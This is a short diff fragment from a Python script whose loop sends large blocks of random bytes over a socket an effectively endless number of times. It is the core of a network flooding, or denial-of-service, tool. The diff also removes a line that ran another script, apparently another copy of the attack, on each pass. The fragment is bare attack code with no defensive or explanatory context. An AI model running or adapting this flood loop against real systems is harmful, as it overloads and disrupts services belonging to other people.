@@ -23,4 +23,3 @@ for i in range(1, 10**1000):
     s.send(random._urandom(10)*1000)
     print(f"Send: {i}", end='\r')
     time.sleep(sleep)
-    os.system("python3 CCT_INF.py")
